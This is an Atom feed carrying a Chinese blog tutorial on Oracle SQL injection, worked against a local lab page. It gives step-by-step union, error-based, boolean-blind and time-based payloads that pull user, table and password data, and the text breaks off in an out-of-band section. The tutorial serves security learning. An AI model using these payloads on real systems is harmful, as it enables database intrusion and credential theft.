<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>我的小blog</title>
  
  <subtitle>分享自己想分享的</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-06-23T16:04:43.744Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Gun97Dt</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>oracle注入</title>
    <link href="http://example.com/2021/06/23/oracle/"/>
    <id>http://example.com/2021/06/23/oracle/</id>
    <published>2021-06-23T12:15:19.000Z</published>
    <updated>2021-06-23T16:04:43.744Z</updated>
    
    <content type="html"><![CDATA[<p>oracle的数据库实例：Oracle数据库的基本单位，等同于Mysql中的库</p><p>数据库实例名是用于和操作系统进行联系的标识，就是说数据库和操作系统之间的交互用的是数据库实例名。实例名也被写入参数文件中，该参数为instance_name，在winnt平台中，实例名同时也被写入注册表。<br>数据库名和实例名可以相同也可以不同。<br>在一般情况下，数据库名和实例名是一对一的关系，但如果在oracle并行服务器架构(即oracle实时应用集群)中，数据库名和实例名是一对多的关系。<span id="more"></span></p><p>数据库实例名与ORACLE_SID<br>虽 然两者都表是oracle实例，但两者是有区别的。instance_name是oracle数据库参数。而ORACLE_SID是操作系统的环境变量。 ORACLD_SID用于与操作系统交互，也就是说，从操作系统的角度访问实例名，必须通过ORACLE_SID。在winnt平 台，ORACLE_SID还需存在于注册表中。<br>且ORACLE_SID必须与instance_name的值一致，否则，你将会收到一个错误，在unix平台，是“ORACLE not available”,在winnt平台，是“TNS:协议适配器错误”。</p><p>当前数据库下有N张表  &lt;=&gt; Oracle：当前用户下有N张表</p><ol><li>DBA: 拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。</li><li>RESOURCE:拥有Resource权限的用户只可以创建实体，不可以创建数据库结构。</li><li>CONNECT:拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构</li><li>一般oracle数据库安装成功后会创建几个默认用户’sys’、’system’、’public’等。</li></ol><h2 id="oracle特性"><a href="#oracle特性" class="headerlink" title="oracle特性"></a>oracle特性</h2><p>Oracle 数据库的注入不同于其他数据库，如Access 和Mysql，它包含了几个系统表，这几个系统表里存储了系统数据库的表名和列名，</p><p>如user_tab_columns，all_tab_columns，all_tables，user_tables 系统表就存储了用户的所有的表、列名，其中table_name 表示的是系统里的表名，column_name 里的是系统里存在的列名</p><p>   Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面永远只有一条记录</p><p>oracle 支持– 类型注释，但是不支持;分隔执行多语句，oracle 有很多系统表，譬如user_tables，通过对这些表的访问也可以判断出是否属于oracle，另外在oracle 里的一些函数也可以用来判断，譬如utl_http.request 这些，语言上的小细节也可以用来区分系统，譬如在oracle 里|| 是连接符号，但是在其他数据库里就不是了，所以 andchr(123)||chr(123)=chr(123)||chr(123)这样的，如果可以顺利执行，那么就基本应该是oracle 了。</p><h3 id="oracle注入中需要注意的一些点"><a href="#oracle注入中需要注意的一些点" class="headerlink" title="oracle注入中需要注意的一些点"></a>oracle注入中需要注意的一些点</h3><ol><li>Oracle 在使用union 查询的跟Mysql不一样Mysql里面我用1,2,3,4就能占位，而在Oracle里面有比较严格的类型要求。也就是说你union select的要和前面的字段类型一样，我们可以用null来代替站位。</li><li>Oracle和mysql不一样，分页中没有limit，而是使用三层查询嵌套的方式实现分页(查询第一条数据“&gt;=0&lt;=1”)：<br>例如: <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM &lt;= 1 ) WHERE RN &gt;=0</span><br></pre></td></tr></table></figure></li></ol><p>Oracle的单行注释符号是–，多行注释符号/**/。</p><h4 id="支持的注释符"><a href="#支持的注释符" class="headerlink" title="支持的注释符"></a>支持的注释符</h4><p>–<br>–空格<br>/**/</p><h2 id="判断Oracle数据库"><a href="#判断Oracle数据库" class="headerlink" title="判断Oracle数据库"></a>判断Oracle数据库</h2><p>1.oracle 支持– 类型注释，但是不支持;分隔执行多语句；oracle 有很多系统表，譬如user_tables，通过对这些表的访问也可以判断出是否属于oracle；另外在oracle 里的一些函数也可以用来判断，譬如utl_http.request 这些；语言上的小细节也可以用来区分系统，譬如在oracle 里|| 是连接符号，但是在其他数据库里就不是了，所以 andchr(123)||chr(123)=chr(123)||chr(123)这样的，如果可以顺利执行，那么就基本应该是oracle 了。</p><p>利用函数来判断是否oracle数据库 如：and len(‘a’)=1（在mssql和mysql以及db2内，返回长度值是调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值。）</p><p>也可以通过dual来判断是否为oracle ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(\*) from dual)&gt;1 --</span><br></pre></td></tr></table></figure><p><img src="/2021/06/23/oracle/image-20210426172344519.jpg" alt="image-20210426172344519.jpg"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(\*) from dual)&gt;0 --</span><br></pre></td></tr></table></figure><p><img src="/2021/06/23/oracle/image-20210426172401354.jpg" alt="image-20210426172401354"></p><p><code>http://127.0.0.1/oracle.php?id=1&#39; and (select count (*) from user_tables)&gt;0--</code><br><img src="/2021/06/23/oracle/image-20210426172624271.jpg" alt="image-20210426172624271"></p><p><code>http://127.0.0.1/oracle.php?id=1&#39; and (select count(*) from all_objects)&gt;0--</code><br><img src="/2021/06/23/oracle/image-20210429112503098.jpg" alt="image-20210429112503098"></p><p>也可以利用：单引号双位数=正确，单引号单位数=错误  的规则。</p><h2 id="联合注入步骤"><a href="#联合注入步骤" class="headerlink" title="联合注入步骤"></a>联合注入步骤</h2><p><img src="/2021/06/23/oracle/image-20210426173217803.jpg" alt="image-20210426173217803"></p><p>判断闭合，和mysql一样，此处判断为单引号闭合：<code>http://127.0.0.1/oracle.php?id=1&#39;--</code><br><img src="/2021/06/23/oracle/image-20210426173202544.jpg" alt="image-20210426173202544"></p><p>判断字段数：<code>http://127.0.0.1/oracle.php?id=1&#39; order by 4 --</code><br><img src="/2021/06/23/oracle/image-20210426173315079.jpg" alt="image-20210426173315079"></p><p>判断联合注入：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select null,null,null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210426173439832.jpg" alt="image-20210426173439832"></p><p>判断每个字段的数据类型：</p><p>第1个字段为数字型：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,null,null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210426173644888.jpg" alt="image-20210426173644888"></p><p>继续判断第2个字段的数据类型：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,2,null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210426173722211.jpg" alt="image-20210426173722211"></p><p>结合上图可以判断出第2个字段为字符串类型：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,&#39;2&#39;,null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210426173823520.jpg" alt="image-20210426173823520"></p><p>然后就可以以此类推来判断后面每个字段的数据类型了，这里就不再重复了。。最终判断的结果为：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,&#39;2&#39;,&#39;3&#39;,&#39;4&#39; from dual--</code><br><img src="/2021/06/23/oracle/image-20210426174000425.jpg" alt="image-20210426174000425"></p><p>判断当前数据库的用户：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select sys_context(&#39;userenv&#39;,&#39;current_user&#39;) from dual),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210427100035497.jpg" alt="image-20210427100035497"></p><p><code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select user from dual),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210427101453578.jpg" alt="image-20210427101453578"></p><p>获取当前数据库的版本：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select banner from sys.v_$version where rownum=1),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210427100447931.jpg" alt="image-20210427100447931"></p><p><code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select banner from v$version where banner like &#39;Oracle%&#39;),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210427101049282.jpg" alt="image-20210427101049282"></p><p><code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select version from v$instance),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210427101139858.jpg" alt="image-20210427101139858"></p><p>获取操作系统版本：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select banner from v$version where banner like &#39;TNS%&#39;),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210427101347658.jpg" alt="image-20210427101347658"></p><p>获取当前数据库名：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select * from global_name),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428101435968.jpg" alt="image-20210428101435968"></p><p><code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select name from v$database),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428102322725.jpg" alt="image-20210428102322725"></p><p><code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select global_name from global_name),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428102357875.jpg" alt="image-20210428102357875"></p><p>获取当时数据库实例名（这里的数据库实例和数据库名是一样的，所以等同于数据库名）：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select instance_name from v$instance),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428102720192.jpg" alt="image-20210428102720192"></p><p>也可以逐个爆破所有的库名：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select owner from all_tables where rownum=1),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428101635386.jpg" alt="image-20210428101635386"></p><p>第二个：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select owner from all_tables where rownum=1 and owner &lt;&gt;&#39;SYS&#39;),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428101720328.jpg" alt="image-20210428101720328"></p><p>第三个：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select owner from all_tables where rownum=1 and owner &lt;&gt;&#39;SYS&#39; and owner &lt;&gt;&#39;OUTLN&#39;),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428101823429.jpg" alt="image-20210428101823429"></p><p>后续以此类推可以不断的去爆破，<strong>注意：库名一定要大写</strong></p><p>一次性获取当前用户的所有表：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select listagg(table_name,&#39;~&#39;) within group(order by 1) from all_tables where owner=&#39;SYSTEM&#39;),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428105424228.jpg" alt="image-20210428105424228"></p><p>也可以依次逐个爆破所有表：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select table_name from user_tables where rownum=1),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428110044955.jpg" alt="image-20210428110044955"></p><p>第二个：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select table_name from user_tables where rownum=1 and table_name&lt;&gt;&#39;LOGMNR_SESSION_EVOLVE$&#39;),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428110140457.jpg" alt="image-20210428110140457"><br>后续以此类推可以不断的去爆破，<strong>注意：表名一定要大写</strong></p><p>获取指定表的字段名：一次性获取指定表的所有字段名：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select listagg(column_name,&#39;:&#39;) within group(order by 1) from all_tab_columns where table_name=&#39;USERS&#39;),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428111236817.jpg" alt="image-20210428111236817"></p><p>也可以逐个去爆破字段名：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select column_name from user_tab_columns where table_name=&#39;USERS&#39; and rownum=1),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428111331062.jpg" alt="image-20210428111331062"></p><p>第二个字段：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select column_name from user_tab_columns where table_name=&#39;USERS&#39; and rownum=1 and column_name&lt;&gt;&#39;ID&#39;),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428111422065.jpg" alt="image-20210428111422065"></p><p>第三个字段：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select column_name from user_tab_columns where table_name=&#39;USERS&#39; and rownum=1 and column_name&lt;&gt;&#39;ID&#39; and column_name&lt;&gt;&#39;UNAME&#39;),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428111502202.jpg" alt="image-20210428111502202"></p><p>依次类推爆破所有的字段名，<strong>注意字段名一定要大写。</strong></p><p>获取字段的内容：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select listagg(id||&#39;:&#39;||uname||&#39;:&#39;||pwd||&#39;:&#39;||email,&#39;\&#39;) within group(order by 1) from users),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428112543564.jpg" alt="image-20210428112543564"></p><p><code>http://127.0.0.1/oracle.php?id=-1&#39; union select null,id||&#39;:&#39;||uname||&#39;:&#39;||pwd||&#39;:&#39;||email,null,null from users--</code><br><img src="/2021/06/23/oracle/image-20210428113858623.jpg" alt="image-20210428113858623"></p><p><strong>爆一条数据</strong>：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select listagg(id||&#39;:&#39;||uname||&#39;:&#39;||pwd||&#39;:&#39;||email) within group(order by 1) from users where rownum=1),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428112714103.jpg" alt="image-20210428112714103"></p><p><code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select CONCAT(uname,pwd) FROM users where rownum=1),null,null from dual-- </code><em><strong>在oracle数据库中，concat函数只能连接两个字符串</strong></em><br><img src="/2021/06/23/oracle/image-20210428112944659.jpg" alt="image-20210428112944659"></p><p><code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select listagg(id||&#39;:&#39;||uname||&#39;:&#39;||pwd||&#39;:&#39;||email) within group(order by 1) from users where rownum=1 and id&lt;&gt;1),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210428113122752.jpg" alt="image-20210428113122752"></p><h2 id="oracle报错注入"><a href="#oracle报错注入" class="headerlink" title="oracle报错注入"></a>oracle报错注入</h2><p>报错方式与mssql一样:使用报错注入需要使用类似 1=[报错语句]，1&gt;[报错语句]，使用比较运算符，这样的方式进行报错注入（MYSQL仅使用函数报错即可）</p><p>报错注入的常用的几个函数：utl_inaddr.get_host_name、ctxsys.drithsx.sn、XMLType、dbms_xdb_version.checkin()、bms_xdb_version.makeversioned()、dbms_xdb_version.uncheckout()、dbms_utility.sqlid_to_sqlhash()、ordsys.ord_dicom.getmappingxpath()、ctxsys.ctx_report.token_type()、utl_inaddr.get_host_address()、decode()等。</p><p>utl_inaddr.get_host_name( ) ：本意是获取ip 地址，但是如果传递参数无法得到解析就会返回一个oracle 错误并显示传递的参数。我们传递的参数是一个sql 语句所以返回的就是语句执行的结果。</p><p>用法：utl_inaddr.get_host_name((sql语句)),<strong>11g之后，使用此函数的数据库用户需要有访问网络的权限</strong></p><p>获取当前用户名：<code>http://127.0.0.1/oracle.php?id=1&#39; and 1=utl_inaddr.get_host_name((select user from dual))--</code><br><img src="/2021/06/23/oracle/image-20210428133440004.jpg" alt="image-20210428133440004"></p><p>也可以：<code>http://127.0.0.1/oracle.php?id=1&#39; and 1=utl_inaddr.get_host_name(&#39;~&#39;||(select user from dual)||&#39;~&#39;)--</code><br><img src="/2021/06/23/oracle/image-20210428155732717.jpg" alt="image-20210428155732717"></p><p>查看版本：<code>http://127.0.0.1/oracle.php?id=1&#39; and 1=utl_inaddr.get_host_name((select banner from sys.v_$version where rownum=1))--</code><br><img src="/2021/06/23/oracle/image-20210428142312901.jpg" alt="image-20210428142312901"></p><p><strong>utl_inaddr.get_host_address()函数:原理同上</strong></p><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=utl_inaddr.get_host_address((sql语句))--</span><br></pre></td></tr></table></figure><p>查询用户：<code>http://127.0.0.1/oracle.php?id=1&#39; and 1=utl_inaddr.get_host_address((select user from dual))--</code><br><img src="/2021/06/23/oracle/image-20210428155501894.jpg" alt="image-20210428155501894"></p><p>同样也可以：<code>http://127.0.0.1/oracle.php?id=1&#39; and 1=utl_inaddr.get_host_address(&#39;~&#39;||(select user from dual)||&#39;~&#39;)--</code><br><img src="/2021/06/23/oracle/image-20210428155817491.jpg" alt="image-20210428155817491"></p><p><strong>ctxsys.drithsx.sn():</strong></p><p>去查询关于主题的对应关键词，然后因为查询失败（应该是这个用户没有创建和查询的权限，默认情况没有创建，<strong>爆出未查询到的错误从而爆出查询的内容</strong>）</p><p><strong>用法：ctxsys.drithsx.sn(1, (sql语句))<strong>，</strong>该函数在查询关于主题的对应关键词时，会报错显示出第二个参数的结果</strong>，这里第二个参数为sql语句，所以报错显示的结果就是sql语句执行后的结果。</p><p>查询当前用户：<code>http://127.0.0.1/oracle.php?id=1&#39; and 1=ctxsys.drithsx.sn(1, (select user from dual))--</code><br><img src="/2021/06/23/oracle/image-20210428143603600.jpg" alt="image-20210428143603600"></p><p><strong>ctxsys.ctx_report.token_type()<strong>：</strong>处理文本的函数，参数错误时会报错。</strong></p><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=ctxsys.ctx_report.token_type((sql语句),1)--</span><br></pre></td></tr></table></figure><p>查询当前用户：<code>http://127.0.0.1/oracle.php?id=1&#39; and 1=ctxsys.ctx_report.token_type((select user from dual),1)--</code><br><img src="/2021/06/23/oracle/image-20210428160712963.jpg" alt="image-20210428160712963"></p><p><strong>XMLType</strong>:环境原因，未能实现。</p><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and (select upper(XMLType(chr(60)||chr(58)||(select user from dual(sql语句))||chr(62))) from dual) is not null --</span><br><span class="line"></span><br><span class="line">select xmltype(<span class="string">&#x27;&lt;:&#x27;</span>||(select user from dual)||<span class="string">&#x27;&gt;&#x27;</span>) from dual</span><br></pre></td></tr></table></figure><p>XMLType在使用这个XMLType进行报错时，很多人不知道为什么要用chr(60)，通过ascii查询可以看到，60:&lt;,58:’:’,62:’&gt;’,查了下相关的api，发现xmltype在进行解析的时候必须以&lt;开头&gt;结尾，这里:冒号在这是必不可少的，另外需要注意的是如果返回的数据种有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出。注意url编码</p><p><strong>dbms_xdb_version.checkin():</strong> 此函数检入已签出的VCR，并返回新创建版本的资源ID，</p><p><strong>用法DBMS_XDB_VERSION.CHECKIN(   pathname VARCHAR2)  RETURN DBMS_XDB.resid_type;  如果路径名不存在，则会引发异常，返回路径名（pathname）</strong></p><p>这里的pathname传入的sql语句，所以报错返回的pathname结果为sql执行的结果值。</p><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.checkin((sql语句)) from dual) is not null</span><br></pre></td></tr></table></figure><p>查询当前用户：<code>http://127.0.0.1/oracle.php?id=1&#39; and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null--</code><br><img src="/2021/06/23/oracle/image-20210428150540239.jpg" alt="image-20210428150540239"></p><p><strong>dbms_xdb_version.makeversioned():</strong> 如果资源不存在，则会引发异。</p><p>用法原理与上面的一样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.makeversioned((sql语句)) from dual) is not null --</span><br></pre></td></tr></table></figure><p>查询当前用户：<code>http://127.0.0.1/oracle.php?id=1&#39;and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null --</code><br><img src="/2021/06/23/oracle/image-20210428152106288.jpg" alt="image-20210428152106288"></p><p><strong>dbms_xdb_version.uncheckout():</strong></p><p>用法原理与上面的一样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.uncheckout((sql语句l)) from dual) is not null --</span><br></pre></td></tr></table></figure><p>查询用户：<code>http://127.0.0.1/oracle.php?id=1&#39; and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null --</code><br><img src="/2021/06/23/oracle/image-20210428152828081.jpg" alt="image-20210428152828081"></p><p><strong>dbms_utility.sqlid_to_sqlhash():</strong> 原理未清楚</p><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (SELECT dbms_utility.sqlid_to_sqlhash((sql语句)) from dual) is not null --</span><br></pre></td></tr></table></figure><p>查询用户：<code>http://127.0.0.1/oracle.php?id=1&#39; and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null --</code><br><img src="/2021/06/23/oracle/image-20210428153735851.jpg" alt="image-20210428153735851"></p><p><strong>ordsys.ord_dicom.getmappingxpath():</strong> 环境原因未能实现</p><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=ordsys.ord_dicom.getmappingxpath((sql语句),user,user)--，</span><br></pre></td></tr></table></figure><p>后面的两个user可有可无，也可以是任意值</p><p>例如：and 1=ordsys.ord_dicom.getmappingxpath((select user from dual))–</p><p><strong>decode():</strong> </p><p>这种方式更偏向布尔型注入，因为这种方式并不会通过报错把查询结果回显回来，仅是用来作为页面的表现不同的判断方法。</p><p>例如当substr(user,1,1)=‘S’页面报错，其他情况页面无报错也不会显示数据，这说明user的第一个字符为S。</p><p>用法：decode(条件,值1,返回值1,值2,返回值2,…值n,返回值n,缺省值)，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select decode(substr(user,1,1),<span class="string">&#x27;S&#x27;</span>,(1/0),0) from dual) --</span><br></pre></td></tr></table></figure><p>代码decode(substr(user,1,1),’S’,(1/0),0)中,substr(user,1,1)=’S’时，就返回(1/0)的值，但是0不能为分母，所以报错！</p><p>查询当前用户名：</p><p>判断第一位：<code>http://127.0.0.1/oracle.php?id=1‘’ and 1=(select decode(substr(user,1,1),&#39;S&#39;,(1/0),0) from dual) --，这里页面报错，说明user第一位字符为S</code><br><img src="/2021/06/23/oracle/image-20210428162546156.jpg" alt="image-20210428162546156"></p><p><code>http://127.0.0.1/oracle.php?id=1&#39; and 1=(select decode(substr(user,1,1),&#39;T&#39;,(1/0),0) from dual) --</code>，这里不报错说明第一位不是T：<br><img src="/2021/06/23/oracle/image-20210428162618097.jpg" alt="image-20210428162618097"></p><p>判断第二位：<code>http://127.0.0.1/oracle.php?id=1&#39; and 1=(select decode(substr(user,2,1),&#39;Y&#39;,(1/0),0) from dual) --</code>：为Y<br><img src="/2021/06/23/oracle/image-20210428162719980.jpg" alt="image-20210428162719980"></p><p>以此类推。</p><p><strong>Instr函数:</strong> 也是通过页面的来判断查询的结果是否正确，正确返回正常，不正确返回错误：</p><p>用法：and 1=instr((sql语句),’猜测要查询的结果’)–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=instr((select user from dual),<span class="string">&#x27;SYSTEM&#x27;</span>)--</span><br></pre></td></tr></table></figure><p>判断当前用户：<code>http://127.0.0.1/oracle.php?id=1&#39; and 1=(instr((select user from dual),&#39;SYSTEM(要大写)&#39;))--</code>，返回正确页面说明是system用户，<br><img src="/2021/06/23/oracle/image-20210428165243780.jpg" alt="image-20210428165243780"></p><p>也可以逐个字符去判断，只要有一个字符不正确就会返回错误页面，例如：</p><p><code>http://127.0.0.1/oracle.php?id=1&#39; and 1=(instr((select user from dual),&#39;St&#39;))--</code><br><img src="/2021/06/23/oracle/image-20210429102200063.jpg" alt="image-20210429102200063"></p><p><code>http://127.0.0.1/oracle.php?id=1&#39; and 1=(instr((select user from dual),&#39;SY&#39;))--</code><br><img src="/2021/06/23/oracle/image-20210429102231732.jpg" alt="image-20210429102231732"></p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>盲注可以使用ASCII()，substr()这种通用组合获取数</p><p><strong>使用length()函数判断长度，使用ascii()和substr()函数猜解数据，</strong></p><p><strong>length用法：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and length((sql语句))=长度--</span><br></pre></td></tr></table></figure><p>判断用户名长度：<code>http://127.0.0.1/oracle.php?id=1&#39; and length((select user from dual))=6--</code><br><img src="/2021/06/23/oracle/image-20210429103451802.jpg" alt="image-20210429103451802"></p><p><strong>ascii()和substr()函数猜解数据</strong></p><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((sql语句),1,1))=ascii码值 --</span><br></pre></td></tr></table></figure><p>逐个拆解用户名：<code>http://127.0.0.1/oracle.php?id=1&#39; and ascii(substr((select user from dual),1,1))=83 --</code><br><img src="/2021/06/23/oracle/image-20210429105444254.jpg" alt="image-20210429105444254"></p><p>也可以用直接用substr函数：<code>http://127.0.0.1/oracle.php?id=1&#39; and (select substr(user,1,1)from dual)=&#39;S&#39; -- </code> 注意大小写<br><img src="/2021/06/23/oracle/image-20210429105709845.jpg" alt="image-20210429105709845"></p><h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><p>在Oracle延时注入利用过程中需要使用DECODE、DBMS_PIPE.RECEIVE_MESSAGE等函数来延时数据库的处理时间，当然也可以是case，if 等方式。最后测试者可以通过网页的加载时间来判断注入结果。</p><p>DECODE函数的使用方法此处不再讨论。</p><p>这里主要利用了oracle管道功能接收消息的函数RECEIVE_MESSAGE，实现延时注入。</p><p>DBMS_PIPE.RECEIVE_MESSAGE(‘任意值’,延迟时间)</p><p>DBMS_PIPE.RECEIVE_MESSAGE(‘RDS’,5)表示从RDS管道返回的数据需要等待5秒，一般情况下可以以PUBLIC权限使用该函数。</p><p>判断是否有延时注入：<code>http://127.0.0.1/oracle.php?id=1&#39; and 1= dbms_pipe.receive_message(&#39;RDS&#39;, 10)-- </code><br><img src="/2021/06/23/oracle/image-20210429110402409.jpg" alt="image-20210429110402409"></p><p>后续步骤需要使用DECODE函数：</p><p>DECODE(condition,value,dbms_pipe.receive_message(‘RDS’, 5),0)，意思是当condition=value就返回dbms_pipe.receive_message(‘RDS’, 5)，那么页面就等待5秒时间，从而达到延时注入的目的。</p><p>判断用户名：<code>http://127.0.0.1/oracle.php?id=1&#39; and 1=(select decode(substr(user,1,1),&#39;S&#39;,dbms_pipe.receive_message(&#39;RDS&#39;,5),0) from dual)--</code><br><img src="/2021/06/23/oracle/image-20210429111303946.jpg" alt="image-20210429111303946"></p><p>也可以：<code>http://127.0.0.1/oracle.php?id=1&#39; and 1=dbms_pipe.receive_message(&#39;aaa&#39;,(decode((select user from dual),&#39;SYSTEM&#39;,3)))--</code><br><img src="/2021/06/23/oracle/image-20210429111502216.jpg" alt="image-20210429111502216"></p><p>如果判断不是就报错：<br><img src="/2021/06/23/oracle/image-20210429111539837.jpg" alt="image-20210429111539837"></p><p>也可以：<code>http://127.0.0.1/oracle.php?id=1&#39; and 1=DBMS_PIPE.RECEIVE_MESSAGE(&#39;pyy&#39;, REPLACE((SELECT substr(user, 1, 1) FROM dual), &#39;S&#39;, 10))--</code><br><img src="/2021/06/23/oracle/image-20210429112925911.jpg" alt="image-20210429112925911"></p><p>后续步骤参考前面的步骤即可。</p><p>也可以用高耗时操作：例如：(select count(*) from all_objects)：对数据库中大量数据进行查询或其他处理的操作，这样的操作会耗费较多的时间，然后通过这个方式来获取数据。这种方式也适用于其他数据库。</p><p>结合decode猜解用户名：<code>http://127.0.0.1/oracle.php?id=1&#39; and 1=(select decode(substr(user,1,1),&#39;S&#39;,(select count(*) from all_objects),0) from dual)--</code>正确：<br><img src="/2021/06/23/oracle/image-20210429112334581.jpg" alt="image-20210429112334581"></p><p><code>http://127.0.0.1/oracle.php?id=1&#39; and 1=(select decode(substr(user,1,1),&#39;a&#39;,(select count(*) from all_objects),0) from dual)--</code>错误：<br><img src="/2021/06/23/oracle/image-20210429112408286.jpg" alt="image-20210429112408286"></p><h2 id="带外攻击OOB"><a href="#带外攻击OOB" class="headerlink" title="带外攻击OOB"></a>带外攻击OOB</h2><p>Oracle的带外注入和DNSLOG很相似，需要使用网络请求的函数进行注入利用，其中可以进行网络请求的函数有UTL_HTTP.REQUEST、UTL_INADDR.GET_HOST_ADDRESS、SYS.DBMS_LDAP.INIT、httpuritype()等。</p><p>一般使用 Oracle 发送HTTP或者DNS请求，将查询结果带到请求中，然后监测外网服务器的HTTP和DNS日志，从日志中获取 sql 